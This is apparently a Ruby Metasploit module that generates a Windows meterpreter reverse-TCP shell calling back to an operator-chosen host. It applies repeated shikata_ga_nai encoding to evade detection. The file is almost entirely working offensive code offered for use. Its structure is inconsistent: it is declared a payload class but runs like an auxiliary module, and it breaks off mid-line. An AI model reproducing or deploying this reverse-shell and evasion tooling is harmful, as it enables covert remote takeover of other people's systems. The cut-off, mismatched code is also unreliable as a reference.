require 'msf/core'

class MetasploitModule < Msf::Payload
  include Msf::Payload::Single

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Custom Payload Generator',
      'Description' => 'Generates a reverse shell payload with custom encoding',
      'Author'      => ['YourName'],
      'License'     => MSF_LICENSE
    ))

    register_options([
      OptString.new('PAYLOAD', [true, 'Payload to generate', 'windows/meterpreter/reverse_tcp']),
      OptString.new('LHOST', [true, 'Local host IP']),
      OptInt.new('LPORT', [true, 'Local port to connect back to', 4444]),
      OptString.new('ENCODER', [true, 'Encoder to use', 'x86/shikata_ga_nai']),
      OptInt.new('ENCODECOUNT', [true, 'Number of times to encode', 3])
    ])
  end

  def run
    print_status("Generating payload with encoding: #{datastore['ENCODER']}")

    payload = framework.payloads.create(datastore['PAYLOAD'])
    payload.datastore['LHOST'] = datastore['LHOST']
    payload.datastore['LPORT'] = datastore['LPORT']

    encoder = datastore['ENCODER']
    iterations = datastore['ENCODECOUNT']

    encoded = payload.generate_simple(
      'Format'        => 'raw',
      'Options'       => payload.datastore,
      'Encoder'       => encoder,
      'EncoderOptions'=> { 'BufferRegister' => 'EAX' },
      'Iterations'    => iterations
    )

    print_good("Generated encoded payload:\n#{encoded.unpac_
